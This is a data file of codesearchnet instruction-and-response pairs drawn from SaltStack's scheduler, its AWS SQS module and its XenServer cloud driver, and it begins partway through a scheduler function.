isinstance(after, datetime.datetime):\n                after = dateutil_parser.parse(after)\n\n            if after >= now:\n                log.debug(\n                    'After time has not passed skipping job: %s.',\n                    data['name']\n                )\n                data['_skip_reason'] = 'after_not_passed'\n                data['_skipped_time'] = now\n                data['_skipped'] = True\n                data['run'] = False\n            else:\n                data['run'] = True\n\n        def _handle_until(data):\n            '''\n            Handle schedule item with until\n            '''\n            if not _WHEN_SUPPORTED:\n                data['_error'] = ('Missing python-dateutil. '\n                                  'Ignoring job {0}'.format(data['name']))\n                log.error(data['_error'])\n                return\n\n            until = data['until']\n            if not isinstance(until, datetime.datetime):\n                until = dateutil_parser.parse(until)\n\n            if until <= now:\n                log.debug(\n                    'Until time has passed skipping job: %s.',\n                    data['name']\n                )\n                data['_skip_reason'] = 'until_passed'\n                data['_skipped_time'] = now\n                data['_skipped'] = True\n                data['run'] = False\n            else:\n                data['run'] = True\n\n        def _chop_ms(dt):\n            '''\n            Remove the microseconds from a datetime object\n            '''\n            return dt - datetime.timedelta(microseconds=dt.microsecond)\n\n        schedule = self._get_schedule()\n        if not isinstance(schedule, dict):\n            raise ValueError('Schedule must be of type dict.')\n        if 'skip_function' in schedule:\n            self.skip_function = schedule['skip_function']\n        if 'skip_during_range' in schedule:\n            self.skip_during_range = schedule['skip_during_range']\n        if 'enabled' in schedule:\n            self.enabled = schedule['enabled']\n        if 'splay' in schedule:\n            self.splay = schedule['splay']\n\n        _hidden = ['enabled',\n                   'skip_function',\n                   'skip_during_range',\n                   'splay']\n        for job, data in six.iteritems(schedule):\n\n            # Skip anything that is a global setting\n            if job in _hidden:\n                continue\n\n            # Clear these out between runs\n            for item in ['_continue',\n                         '_error',\n                         '_enabled',\n                         '_skipped',\n                         '_skip_reason',\n                         '_skipped_time']:\n                if item in data:\n                    del data[item]\n            run = False\n\n            if 'name' in data:\n                job_name = data['name']\n            else:\n                job_name = data['name'] = job\n\n            if not isinstance(data, dict):\n                log.error(\n                    'Scheduled job \"%s\" should have a dict value, not %s',\n                    job_name, type(data)\n                )\n                continue\n            if 'function' in data:\n                func = data['function']\n            elif 'func' in data:\n                func = data['func']\n            elif 'fun' in data:\n                func = data['fun']\n            else:\n                func = None\n            if not isinstance(func, list):\n                func = [func]\n            for _func in func:\n                if _func not in self.functions:\n                    log.info(\n                        'Invalid function: %s in scheduled job %s.',\n                        _func, job_name\n                    )\n\n            if '_next_fire_time' not in data:\n                data['_next_fire_time'] = None\n\n            if '_splay' not in data:\n                data['_splay'] = None\n\n            if 'run_on_start' in data and \\\n                    data['run_on_start'] and \\\n                    '_run_on_start' not in data:\n                data['_run_on_start'] = True\n\n            if not now:\n                now = datetime.datetime.now()\n\n            # Used for quick lookups when detecting invalid option\n            # combinations.\n            schedule_keys = set(data.keys())\n\n            time_elements = ('seconds', 'minutes', 'hours', 'days')\n            scheduling_elements = ('when', 'cron', 'once')\n\n            invalid_sched_combos = [\n                set(i) for i in itertools.combinations(scheduling_elements, 2)\n            ]\n\n            if any(i <= schedule_keys for i in invalid_sched_combos):\n                log.error(\n                    'Unable to use \"%s\" options together. Ignoring.',\n                    '\", \"'.join(scheduling_elements)\n                )\n                continue\n\n            invalid_time_combos = []\n            for item in scheduling_elements:\n                all_items = itertools.chain([item], time_elements)\n                invalid_time_combos.append(\n                    set(itertools.combinations(all_items, 2)))\n\n            if any(set(x) <= schedule_keys for x in invalid_time_combos):\n                log.error(\n                    'Unable to use \"%s\" with \"%s\" options. Ignoring',\n                    '\", \"'.join(time_elements),\n                    '\", \"'.join(scheduling_elements)\n                )\n                continue\n\n            if 'run_explicit' in data:\n                _handle_run_explicit(data, loop_interval)\n                run = data['run']\n\n            if True in [True for item in time_elements if item in data]:\n                _handle_time_elements(data)\n            elif 'once' in data:\n                _handle_once(data, loop_interval)\n            elif 'when' in data:\n                _handle_when(data, loop_interval)\n            elif 'cron' in data:\n                _handle_cron(data, loop_interval)\n            else:\n                continue\n\n            # Something told us to continue, so we continue\n            if '_continue' in data and data['_continue']:\n                continue\n\n            # An error occurred so we bail out\n            if '_error' in data and data['_error']:\n                continue\n\n            seconds = int((_chop_ms(data['_next_fire_time']) - _chop_ms(now)).total_seconds())\n\n            # If there is no job specific splay available,\n            # grab the global which defaults to None.\n            if 'splay' not in data:\n                data['splay'] = self.splay\n\n            if 'splay' in data and data['splay']:\n                # Got \"splay\" configured, make decision to run a job based on that\n                if not data['_splay']:\n                    # Try to add \"splay\" time only if next job fire time is\n                    # still in the future. We should trigger job run\n                    # immediately otherwise.\n                    splay = _splay(data['splay'])\n                    if now < data['_next_fire_time'] + datetime.timedelta(seconds=splay):\n                        log.debug('schedule.handle_func: Adding splay of '\n                                  '%s seconds to next run.', splay)\n                        data['_splay'] = data['_next_fire_time'] + datetime.timedelta(seconds=splay)\n                        if 'when' in data:\n                            data['_run'] = True\n                    else:\n                        run = True\n\n                if data['_splay']:\n                    # The \"splay\" configuration has been already processed, just use it\n                    seconds = (data['_splay'] - now).total_seconds()\n                    if 'when' in data:\n                        data['_next_fire_time'] = data['_splay']\n\n            if '_seconds' in data:\n                if seconds <= 0:\n                    run = True\n            elif 'when' in data and data['_run']:\n                if data['_next_fire_time'] <= now <= (data['_next_fire_time'] + loop_interval):\n                    data['_run'] = False\n                    run = True\n            elif 'cron' in data:\n                # Reset next scheduled time because it is in the past now,\n                # and we should trigger the job run, then wait for the next one.\n                if seconds <= 0:\n                    data['_next_fire_time'] = None\n                    run = True\n            elif 'once' in data:\n                if data['_next_fire_time'] <= now <= (data['_next_fire_time'] + loop_interval):\n                    run = True\n            elif seconds == 0:\n                run = True\n\n            if '_run_on_start' in data and data['_run_on_start']:\n                run = True\n                data['_run_on_start'] = False\n            elif run:\n                if 'range' in data:\n                    _handle_range(data)\n\n                    # An error occurred so we bail out\n                    if '_error' in data and data['_error']:\n                        continue\n\n                    run = data['run']\n                    # Override the functiton if passed back\n                    if 'func' in data:\n                        func = data['func']\n\n                # If there is no job specific skip_during_range available,\n                # grab the global which defaults to None.\n                if 'skip_during_range' not in data and self.skip_during_range:\n                    data['skip_during_range'] = self.skip_during_range\n\n                if 'skip_during_range' in data and data['skip_during_range']:\n                    _handle_skip_during_range(data, loop_interval)\n\n                    # An error occurred so we bail out\n                    if '_error' in data and data['_error']:\n                        continue\n\n                    run = data['run']\n                    # Override the functiton if passed back\n                    if 'func' in data:\n                        func = data['func']\n\n                if 'skip_explicit' in data:\n                    _handle_skip_explicit(data, loop_interval)\n\n                    # An error occurred so we bail out\n                    if '_error' in data and data['_error']:\n                        continue\n\n                    run = data['run']\n                    # Override the functiton if passed back\n                    if 'func' in data:\n                        func = data['func']\n\n                if 'until' in data:\n                    _handle_until(data)\n\n                    # An error occurred so we bail out\n                    if '_error' in data and data['_error']:\n                        continue\n\n                    run = data['run']\n\n                if 'after' in data:\n                    _handle_after(data)\n\n                    # An error occurred so we bail out\n                    if '_error' in data and data['_error']:\n                        continue\n\n                    run = data['run']\n\n                # If args is a list and less than the number of functions\n                # run is set to False.\n                if 'args' in data and isinstance(data['args'], list):\n                    if len(data['args']) < len(func):\n                        data['_error'] = ('Number of arguments is less than '\n                                          'the number of functions. Ignoring job.')\n                        log.error(data['_error'])\n                        run = False\n\n            # If the job item has continue, then we set run to False\n            # so the job does not run but we still get the important\n            # information calculated, eg. _next_fire_time\n            if '_continue' in data and data['_continue']:\n                run = False\n\n            # If there is no job specific enabled available,\n            # grab the global which defaults to True.\n            if 'enabled' not in data:\n                data['enabled'] = self.enabled\n\n            # If globally disabled, disable the job\n            if not self.enabled:\n                data['enabled'] = self.enabled\n                data['_skip_reason'] = 'disabled'\n                data['_skipped_time'] = now\n                data['_skipped'] = True\n                run = False\n\n            # Job is disabled, set run to False\n            if 'enabled' in data and not data['enabled']:\n                data['_enabled'] = False\n                data['_skip_reason'] = 'disabled'\n                data['_skipped_time'] = now\n                data['_skipped'] = True\n                run = False\n\n            miss_msg = ''\n            if seconds < 0:\n                miss_msg = ' (runtime missed ' \\\n                           'by {0} seconds)'.format(abs(seconds))\n\n            try:\n                if run:\n                    # Job is disabled, continue\n                    if 'enabled' in data and not data['enabled']:\n                        log.debug('Job: %s is disabled', job_name)\n                        data['_skip_reason'] = 'disabled'\n                        data['_skipped_time'] = now\n                        data['_skipped'] = True\n                        continue\n\n                    if 'jid_include' not in data or data['jid_include']:\n                        data['jid_include'] = True\n                        log.debug('schedule: Job %s was scheduled with jid_include, '\n                                  'adding to cache (jid_include defaults to True)',\n                                  job_name)\n                        if 'maxrunning' in data:\n                            log.debug('schedule: Job %s was scheduled with a max '\n                                      'number of %s', job_name, data['maxrunning'])\n                        else:\n                            log.info('schedule: maxrunning parameter was not specified for '\n                                     'job %s, defaulting to 1.', job_name)\n                            data['maxrunning'] = 1\n\n                    if not self.standalone:\n                        data['run'] = run\n                        data = self._check_max_running(func,\n                                                       data,\n                                                       self.opts,\n                                                       now)\n                        run = data['run']\n\n                # Check run again, just in case _check_max_running\n                # set run to False\n                if run:\n                    log.info('Running scheduled job: %s%s', job_name, miss_msg)\n                    self._run_job(func, data)\n\n            finally:\n                # Only set _last_run if the job ran\n                if run:\n                    data['_last_run'] = now\n                    data['_splay'] = None\n                if '_seconds' in data:\n                    if self.standalone:\n                        data['_next_fire_time'] = now + datetime.timedelta(seconds=data['_seconds'])\n                    elif '_skipped' in data and data['_skipped']:\n                        data['_next_fire_time'] = now + datetime.timedelta(seconds=data['_seconds'])\n                    elif run:\n                        data['_next_fire_time'] = now + datetime.timedelta(seconds=data['_seconds'])"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nrunning the given command against AWS and returns the output as a json string", "response": "def _run_aws(cmd, region, opts, user, **kwargs):\n    '''\n    Runs the given command against AWS.\n    cmd\n        Command to run\n    region\n        Region to execute cmd in\n    opts\n        Pass in from salt\n    user\n        Pass in from salt\n    kwargs\n        Key-value arguments to pass to the command\n    '''\n    # These args need a specific key value that aren't\n    # valid python parameter keys\n    receipthandle = kwargs.pop('receipthandle', None)\n    if receipthandle:\n        kwargs['receipt-handle'] = receipthandle\n    num = kwargs.pop('num', None)\n    if num:\n        kwargs['max-number-of-messages'] = num\n\n    _formatted_args = [\n        '--{0} \"{1}\"'.format(k, v) for k, v in six.iteritems(kwargs)]\n\n    cmd = 'aws sqs {cmd} {args} {region} {out}'.format(\n        cmd=cmd,\n        args=' '.join(_formatted_args),\n        region=_region(region),\n        out=_OUTPUT)\n\n    rtn = __salt__['cmd.run'](cmd, runas=user, python_shell=False)\n\n    return salt.utils.json.loads(rtn) if rtn else ''"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef receive_message(queue, region, num=1, opts=None, user=None):\n    '''\n    Receive one or more messages from a queue in a region\n\n    queue\n        The name of the queue to receive messages from\n\n    region\n        Region where SQS queues exists\n\n    num : 1\n        The max number of messages to receive\n\n    opts : None\n        Any additional options to add to the command line\n\n    user : None\n        Run as a user other than what the minion runs as\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' aws_sqs.receive_message <sqs queue> <region>\n        salt '*' aws_sqs.receive_message <sqs queue> <region> num=10\n\n    .. versionadded:: 2014.7.0\n\n    '''\n    ret = {\n            'Messages': None,\n          }\n    queues = list_queues(region, opts, user)\n    url_map = _parse_queue_list(queues)\n    if queue not in url_map:\n        log.info('\"%s\" queue does not exist.', queue)\n        return ret\n\n    out = _run_aws('receive-message', region, opts, user, queue=url_map[queue],\n                   num=num)\n    ret['Messages'] = out['Messages']\n    return ret", "response": "Receive one or more messages from a queue in a region"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ndeletes one or more messages from a queue in a region", "response": "def delete_message(queue, region, receipthandle, opts=None, user=None):\n    '''\n    Delete one or more messages from a queue in a region\n\n    queue\n        The name of the queue to delete messages from\n\n    region\n        Region where SQS queues exists\n\n    receipthandle\n        The ReceiptHandle of the message to delete. The ReceiptHandle\n        is obtained in the return from receive_message\n\n    opts : None\n        Any additional options to add to the command line\n\n    user : None\n        Run as a user other than what the minion runs as\n\n    CLI Example:\n\n    .. code-block:: bash\n\n        salt '*' aws_sqs.delete_message <sqs queue> <region> receipthandle='<sqs ReceiptHandle>'\n\n    .. versionadded:: 2014.7.0\n\n    '''\n    queues = list_queues(region, opts, user)\n    url_map = _parse_queue_list(queues)\n    if queue not in url_map:\n        log.info('\"%s\" queue does not exist.', queue)\n        return False\n\n    out = _run_aws('delete-message', region, opts, user,\n                   receipthandle=receipthandle, queue=url_map[queue],)\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nlist the SQS queues in the specified region", "response": "def list_queues(region, opts=None, user=None):\n    '''\n    List the queues in the selected region.\n\n    region\n        Region to list SQS queues for\n\n    opts : None\n        Any additional options to add to the command line\n\n    user : None\n        Run hg as a user other than what the minion runs as\n\n    CLI Example:\n\n        salt '*' aws_sqs.list_queues <region>\n\n    '''\n    out = _run_aws('list-queues', region, opts, user)\n\n    ret = {\n        'retcode': 0,\n        'stdout': out['QueueUrls'],\n    }\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new SQS queue with the correct name and region", "response": "def create_queue(name, region, opts=None, user=None):\n    '''\n    Creates a queue with the correct name.\n\n    name\n        Name of the SQS queue to create\n\n    region\n        Region to create the SQS queue in\n\n    opts : None\n        Any additional options to add to the command line\n\n    user : None\n        Run hg as a user other than what the minion runs as\n\n    CLI Example:\n\n        salt '*' aws_sqs.create_queue <sqs queue> <region>\n\n    '''\n\n    create = {'queue-name': name}\n    out = _run_aws(\n        'create-queue', region=region, opts=opts,\n        user=user, **create)\n\n    ret = {\n        'retcode': 0,\n        'stdout': out['QueueUrl'],\n        'stderr': '',\n    }\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef delete_queue(name, region, opts=None, user=None):\n    '''\n    Deletes a queue in the region.\n\n    name\n        Name of the SQS queue to deletes\n    region\n        Name of the region to delete the queue from\n\n    opts : None\n        Any additional options to add to the command line\n\n    user : None\n        Run hg as a user other than what the minion runs as\n\n    CLI Example:\n\n        salt '*' aws_sqs.delete_queue <sqs queue> <region>\n\n    '''\n    queues = list_queues(region, opts, user)\n    url_map = _parse_queue_list(queues)\n\n    log.debug('map %s', url_map)\n    if name in url_map:\n        delete = {'queue-url': url_map[name]}\n\n        rtn = _run_aws(\n            'delete-queue',\n            region=region,\n            opts=opts,\n            user=user,\n            **delete)\n        success = True\n        err = ''\n        out = '{0} deleted'.format(name)\n\n    else:\n        out = ''\n        err = \"Delete failed\"\n        success = False\n\n    ret = {\n        'retcode': 0 if success else 1,\n        'stdout': out,\n        'stderr': err,\n    }\n    return ret", "response": "Delete a SQS queue in a specific region"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef queue_exists(name, region, opts=None, user=None):\n    '''\n    Returns True or False on whether the queue exists in the region\n\n    name\n        Name of the SQS queue to search for\n\n    region\n        Name of the region to search for the queue in\n\n    opts : None\n        Any additional options to add to the command line\n\n    user : None\n        Run hg as a user other than what the minion runs as\n\n    CLI Example:\n\n        salt '*' aws_sqs.queue_exists <sqs queue> <region>\n\n    '''\n    output = list_queues(region, opts, user)\n\n    return name in _parse_queue_list(output)", "response": "Returns True or False on whether the queue exists in the region"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nparses the queue list to get a dict of name -> URL", "response": "def _parse_queue_list(list_output):\n    '''\n    Parse the queue to get a dict of name -> URL\n    '''\n    queues = dict((q.split('/')[-1], q) for q in list_output['stdout'])\n    return queues"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngets a connection to the XenServer host", "response": "def _get_session():\n    '''\n    Get a connection to the XenServer host\n    '''\n    api_version = '1.0'\n    originator = 'salt_cloud_{}_driver'.format(__virtualname__)\n    url = config.get_cloud_config_value(\n        'url',\n        get_configured_provider(),\n        __opts__,\n        search_global=False\n    )\n    user = config.get_cloud_config_value(\n        'user',\n        get_configured_provider(),\n        __opts__,\n        search_global=False\n    )\n    password = config.get_cloud_config_value(\n        'password',\n        get_configured_provider(),\n        __opts__,\n        search_global=False\n    )\n    ignore_ssl = config.get_cloud_config_value(\n        'ignore_ssl',\n        get_configured_provider(),\n        __opts__,\n        default=False,\n        search_global=False\n    )\n    try:\n        session = XenAPI.Session(url, ignore_ssl=ignore_ssl)\n        log.debug(\n            'url: %s user: %s password: %s, originator: %s',\n            url, user, 'XXX-pw-redacted-XXX', originator\n        )\n        session.xenapi.login_with_password(\n            user, password, api_version, originator)\n    except XenAPI.Failure as ex:\n        pool_master_addr = six.text_type(ex.__dict__['details'][1])\n        slash_parts = url.split('/')\n        new_url = '/'.join(slash_parts[:2]) + '/' + pool_master_addr\n        session = XenAPI.Session(new_url)\n        log.debug(\n            'session is -> url: %s user: %s password: %s, originator:%s',\n            new_url, user, 'XXX-pw-redacted-XXX', originator\n        )\n        session.xenapi.login_with_password(\n            user, password, api_version, originator)\n    return session"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nlist virtual machines in a single virtual machine.", "response": "def list_nodes():\n    '''\n    List virtual machines\n\n      .. code-block:: bash\n\n          salt-cloud -Q\n\n    '''\n    session = _get_session()\n    vms = session.xenapi.VM.get_all_records()\n    ret = {}\n    for vm in vms:\n        record = session.xenapi.VM.get_record(vm)\n        if not record['is_a_template'] and not record['is_control_domain']:\n            try:\n                base_template_name = record['other_config']['base_template_name']\n            except Exception:\n                base_template_name = None\n                log.debug(\n                    'VM %s, doesnt have base_template_name attribute',\n                    record['name_label']\n                )\n            ret[record['name_label']] = {'id': record['uuid'],\n                                         'image': base_template_name,\n                                         'name': record['name_label'],\n                                         'size': record['memory_dynamic_max'],\n                                         'state': record['power_state'],\n                                         'private_ips': get_vm_ip(record['name_label'], session),\n                                         'public_ips': None}\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\ngets the IP address of the VM", "response": "def get_vm_ip(name=None, session=None, call=None):\n    '''\n    Get the IP address of the VM\n\n    .. code-block:: bash\n\n        salt-cloud -a get_vm_ip xenvm01\n\n    .. note:: Requires xen guest tools to be installed in VM\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'This function must be called with -a or --action.'\n        )\n    if session is None:\n        log.debug('New session being created')\n        session = _get_session()\n    vm = _get_vm(name, session=session)\n    ret = None\n    # -- try to get ip from vif\n    vifs = session.xenapi.VM.get_VIFs(vm)\n    if vifs is not None:\n        for vif in vifs:\n            if session.xenapi.VIF.get_ipv4_addresses(vif):\n                cidr = session.xenapi.VIF.get_ipv4_addresses(vif).pop()\n                ret, subnet = cidr.split('/')\n                log.debug(\n                    'VM vif returned for instance: %s ip: %s', name, ret)\n                return ret\n    # -- try to get ip from get tools metrics\n    vgm = session.xenapi.VM.get_guest_metrics(vm)\n    try:\n        net = session.xenapi.VM_guest_metrics.get_networks(vgm)\n        if \"0/ip\" in net.keys():\n            log.debug(\n                'VM guest metrics returned for instance: %s 0/ip: %s',\n                name, net[\"0/ip\"]\n            )\n            ret = net[\"0/ip\"]\n    # except Exception as ex:\n    except XenAPI.Failure:\n        log.info('Could not get vm metrics at this time')\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nsetting the IP address on a virtual interface.", "response": "def set_vm_ip(name=None,\n              ipv4_cidr=None,\n              ipv4_gw=None,\n              session=None,\n              call=None):\n    '''\n    Set the IP address on a virtual interface (vif)\n\n    '''\n    mode = 'static'\n    # TODO: Need to add support for IPv6\n    if call == 'function':\n        raise SaltCloudException(\n            'The function must be called with -a or --action.')\n\n    log.debug(\n        'Setting name: %s ipv4_cidr: %s ipv4_gw: %s mode: %s',\n        name, ipv4_cidr, ipv4_gw, mode\n    )\n    if session is None:\n        log.debug('New session being created')\n        session = _get_session()\n    vm = _get_vm(name, session)\n    # -- try to get ip from vif\n    # TODO: for now will take first interface\n    #       addition consideration needed for\n    #       multiple interface(vif) VMs\n    vifs = session.xenapi.VM.get_VIFs(vm)\n    if vifs is not None:\n        log.debug('There are %s vifs.', len(vifs))\n        for vif in vifs:\n            record = session.xenapi.VIF.get_record(vif)\n            log.debug(record)\n            try:\n                session.xenapi.VIF.configure_ipv4(\n                    vif, mode, ipv4_cidr, ipv4_gw)\n            except XenAPI.Failure:\n                log.info('Static IP assignment could not be performed.')\n\n    return True"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef list_nodes_full(session=None):\n    '''\n    List full virtual machines\n\n      .. code-block:: bash\n\n          salt-cloud -F\n\n    '''\n    if session is None:\n        session = _get_session()\n\n    ret = {}\n    vms = session.xenapi.VM.get_all()\n    for vm in vms:\n        record = session.xenapi.VM.get_record(vm)\n        if not record['is_a_template'] and not record['is_control_domain']:\n            # deal with cases where the VM doesn't have 'base_template_name' attribute\n            try:\n                base_template_name = record['other_config']['base_template_name']\n            except Exception:\n                base_template_name = None\n                log.debug(\n                    'VM %s, doesnt have base_template_name attribute',\n                    record['name_label']\n                )\n            vm_cfg = session.xenapi.VM.get_record(vm)\n            vm_cfg['id'] = record['uuid']\n            vm_cfg['name'] = record['name_label']\n            vm_cfg['image'] = base_template_name\n            vm_cfg['size'] = None\n            vm_cfg['state'] = record['power_state']\n            vm_cfg['private_ips'] = get_vm_ip(record['name_label'], session)\n            vm_cfg['public_ips'] = None\n            if 'snapshot_time' in vm_cfg.keys():\n                del vm_cfg['snapshot_time']\n            ret[record['name_label']] = vm_cfg\n\n    provider = __active_provider_name__ or 'xen'\n    if ':' in provider:\n        comps = provider.split(':')\n        provider = comps[0]\n    log.debug('ret: %s', ret)\n    log.debug('provider: %s', provider)\n    log.debug('__opts__: %s', __opts__)\n    __utils__['cloud.cache_node_list'](ret, provider, __opts__)\n    return ret", "response": "List all virtual machines in the current state"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a list of available Xen VDI images", "response": "def vdi_list(call=None, kwargs=None):\n    '''\n    Return available Xen VDI images\n\n    If this function is called with the ``-f`` or ``--function`` then\n    it can return a list with minimal deatil using the ``terse=True`` keyword\n    argument.\n\n    .. code-block:: bash\n\n        salt-cloud -f vdi_list myxen terse=True\n\n    '''\n    if call == 'action':\n        raise SaltCloudException(\n            'This function must be called with -f or --function.')\n    log.debug('kwargs is %s', kwargs)\n    if kwargs is not None:\n        if 'terse' in kwargs:\n            if kwargs['terse'] == 'True':\n                terse = True\n            else:\n                terse = False\n        else:\n            terse = False\n    else:\n        kwargs = {}\n        terse = False\n    session = _get_session()\n    vdis = session.xenapi.VDI.get_all()\n    ret = {}\n    for vdi in vdis:\n        data = session.xenapi.VDI.get_record(vdi)\n        log.debug(type(terse))\n        if terse is True:\n            ret[data.get('name_label')] = {\n                'uuid': data.get('uuid'),\n                'OpqueRef': vdi}\n        else:\n            data.update({'OpaqueRef': vdi})\n            ret[data.get('name_label')] = data\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef template_list(call=None):\n    '''\n    Return available Xen template information.\n\n    This returns the details of\n    each template to show number cores, memory sizes, etc..\n\n    .. code-block:: bash\n\n       salt-cloud -f template_list myxen\n\n    '''\n    templates = {}\n    session = _get_session()\n    vms = session.xenapi.VM.get_all()\n    for vm in vms:\n        record = session.xenapi.VM.get_record(vm)\n        if record['is_a_template']:\n            templates[record['name_label']] = record\n    return templates", "response": "Return available Xen template information."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nshow information about a specific VM or template.", "response": "def show_instance(name, session=None, call=None):\n    '''\n    Show information about a specific VM or template\n\n        .. code-block:: bash\n\n            salt-cloud -a show_instance xenvm01\n\n    .. note:: memory is memory_dynamic_max\n\n    '''\n    if call == 'function':\n        raise SaltCloudException(\n            'The show_instnce function must be called with -a or --action.'\n        )\n    log.debug('show_instance-> name: %s session: %s', name, session)\n    if session is None:\n        session = _get_session()\n    vm = _get_vm(name, session=session)\n    record = session.xenapi.VM.get_record(vm)\n    if not record['is_a_template'] and not record['is_control_domain']:\n        try:\n            base_template_name = record['other_config']['base_template_name']\n        except Exception:\n            base_template_name = None\n            log.debug(\n                'VM %s, doesnt have base_template_name attribute',\n                record['name_label']\n            )\n        ret = {'id': record['uuid'],\n               'image': base_template_name,\n               'name': record['name_label'],\n               'size': record['memory_dynamic_max'],\n               'state': record['power_state'],\n               'private_ips': get_vm_ip(name, session),\n               'public_ips': None}\n\n        __utils__['cloud.cache_node'](\n            ret,\n            __active_provider_name__,\n            __opts__\n        )\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _determine_resource_pool(session, vm_):\n    '''\n    Called by create() used to determine resource pool\n    '''\n    resource_pool = ''\n    if 'resource_pool' in vm_.keys():\n        resource_pool = _get_pool(vm_['resource_pool'], session)\n    else:\n        pool = session.xenapi.pool.get_all()\n        if not pool:\n            resource_pool = None\n        else:\n            first_pool = session.xenapi.pool.get_all()[0]\n            resource_pool = first_pool\n    pool_record = session.xenapi.pool.get_record(resource_pool)\n    log.debug('resource pool: %s', pool_record['name_label'])\n    return resource_pool", "response": "Called by create to determine resource pool"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ndetermines the storage repo for the current resource pool.", "response": "def _determine_storage_repo(session, resource_pool, vm_):\n    '''\n    Called by create() used to determine storage repo for create\n    '''\n    storage_repo = ''\n    if 'storage_repo' in vm_.keys():\n        storage_repo = _get_sr(vm_['storage_repo'], session)\n    else:\n        storage_repo = None\n        if resource_pool:\n            default_sr = session.xenapi.pool.get_default_SR(resource_pool)\n            sr_record = session.xenapi.SR.get_record(default_sr)\n            log.debug('storage repository: %s', sr_record['name_label'])\n            storage_repo = default_sr\n        else:\n            storage_repo = None\n    log.debug('storage repository: %s', storage_repo)\n    return storage_repo"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ncreate a VM in Xen", "response": "def create(vm_):\n    '''\n    Create a VM in Xen\n\n    The configuration for this function is read from the profile settings.\n\n    .. code-block:: bash\n\n        salt-cloud -p some_profile xenvm01\n\n    '''\n    name = vm_['name']\n    record = {}\n    ret = {}\n\n    # fire creating event\n    __utils__['cloud.fire_event'](\n        'event',\n        'starting create',\n        'salt/cloud/{0}/creating'.format(name),\n        args={\n            'name': name,\n            'profile': vm_['profile'],\n            'provider': vm_['driver'],\n        },\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n    log.debug('Adding %s to cloud cache.', name)\n    __utils__['cloud.cachedir_index_add'](\n        vm_['name'], vm_['profile'], 'xen', vm_['driver']\n    )\n\n    # connect to xen\n    session = _get_session()\n\n    # determine resource pool\n    resource_pool = _determine_resource_pool(session, vm_)\n\n    # determine storage repo\n    storage_repo = _determine_storage_repo(session, resource_pool, vm_)\n\n    # build VM\n    image = vm_.get('image')\n    clone = vm_.get('clone')\n    if clone is None:\n        clone = True\n    log.debug('Clone: %s ', clone)\n\n    # fire event to read new vm properties (requesting)\n    __utils__['cloud.fire_event'](\n        'event',\n        'requesting instance',\n        'salt/cloud/{0}/requesting'.format(name),\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n\n    # create by cloning template\n    if clone:\n        _clone_vm(image, name, session)\n    else:\n        _copy_vm(image, name, session, storage_repo)\n\n    # provision template to vm\n    _provision_vm(name, session)\n    vm = _get_vm(name, session)\n\n    # start vm\n    start(name, None, session)\n\n    # get new VM\n    vm = _get_vm(name, session)\n\n    # wait for vm to report IP via guest tools\n    _wait_for_ip(name, session)\n\n    # set static IP if configured\n    _set_static_ip(name, session, vm_)\n\n    # if not deploying salt then exit\n    deploy = vm_.get('deploy', True)\n    log.debug('delopy is set to %s', deploy)\n    if deploy:\n        record = session.xenapi.VM.get_record(vm)\n        if record is not None:\n            _deploy_salt_minion(name, session, vm_)\n    else:\n        log.debug(\n            'The Salt minion will not be installed, deploy: %s',\n            vm_['deploy']\n        )\n    record = session.xenapi.VM.get_record(vm)\n    ret = show_instance(name)\n    ret.update({'extra': record})\n\n    __utils__['cloud.fire_event'](\n        'event',\n        'created instance',\n        'salt/cloud/{0}/created'.format(name),\n        args={\n            'name': name,\n            'profile': vm_['profile'],\n            'provider': vm_['driver'],\n        },\n        sock_dir=__opts__['sock_dir'],\n        transport=__opts__['transport']\n    )\n    return ret"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef _deploy_salt_minion(name, session, vm_):\n    '''\n    Deploy salt minion during create()\n    '''\n    # Get bootstrap values\n    vm_['ssh_host'] = get_vm_ip(name, session)\n    vm_['user'] = vm_.get('user', 'root')\n    vm_['password'] = vm_.get('password', 'p@ssw0rd!')\n    vm_['provider'] = vm_.get('provider', 'xen')\n    log.debug('%s has IP of %s', name, vm_['ssh_host'])\n    # Bootstrap Salt minion!\n    if vm_['ssh_host'] is not None:\n        log.info('Installing Salt minion on %s', name)\n        boot_ret = __utils__['cloud.bootstrap'](vm_, __opts__)\n        log.debug('boot return: %s', boot_ret)", "response": "Deploy a salt minion during create"}
